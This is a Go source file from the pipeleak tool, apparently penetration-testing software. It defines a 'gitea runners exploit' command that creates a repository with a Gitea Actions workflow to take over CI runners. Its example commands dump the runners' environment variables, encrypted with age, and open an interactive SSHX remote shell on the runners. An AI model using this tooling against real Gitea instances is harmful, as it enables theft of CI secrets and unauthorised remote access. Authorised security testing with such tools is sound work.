package exploit

import (
	"github.com/CompassSecurity/pipeleak/pkg/gitea/runners/exploit"
	"github.com/rs/zerolog/log"
	"github.com/spf13/cobra"
)

func NewExploitCmd(giteaUrl *string, giteaApiToken *string) *cobra.Command {
	var runnerLabels []string
	var ageEncryptionPublicKey string
	var repoName string
	var dry bool
	var shell bool

	exploitCmd := &cobra.Command{
		Use:   "exploit",
		Short: "Create repository with Gitea Actions workflow to exploit available runners",
		Long:  "Creates a repository, generates a workflow with jobs for available runner labels.",
		Example: `
# Creates a repository with jobs for runners with ubuntu-latest and self-hosted labels. Dumps envs encrypted using Age and starts an interactive SSHX shell.		
pipeleak gitea runners exploit --token xxxxx --gitea https://gitea.mydomain.com --labels ubuntu-latest,self-hosted --age-public-key age1... --repo-name my-exploit-repo --dry=false --shell=true

# Print the generated workflow YAML only, does NOT create a repository or jobs
pipeleak gitea runners exploit --token xxxxx --gitea https://gitea.mydomain.com --dry=true --shell=true
 		`,
		Run: func(cmd *cobra.Command, args []string) {
			exploit.ExploitRunners(runnerLabels, dry, shell, *giteaApiToken, *giteaUrl, ageEncryptionPublicKey, repoName)
			log.Info().Msg("Done, Bye Bye üè≥Ô∏è‚Äçüåàüî•")
		},
	}

	exploitCmd.Flags().StringSliceVarP(&runnerLabels, "labels", "", []string{}, "Jobs with the following runner labels are created")
	exploitCmd.Flags().StringVarP(&ageEncryptionPublicKey, "age-public-key", "", "", "An age public key generated with ./age-keygen -o key.txt (repo: https://github.com/FiloSottile/age). Prints the encrypted environment variables in the output log.")
	exploitCmd.Flags().StringVarP(&repoName, "repo-name", "", "pipeleak-runner-test", "The name for the created repository")
	exploitCmd.PersistentFlags().BoolVarP(&dry, "dry", "d", false, "Only generate and print the workflow YAML, do NOT create real jobs")
	exploitCmd.PersistentFlags().BoolVarP(&shell, "shell", "s", true, "Add an SSHX interactive shell to the jobs")

	return exploitCmd
}
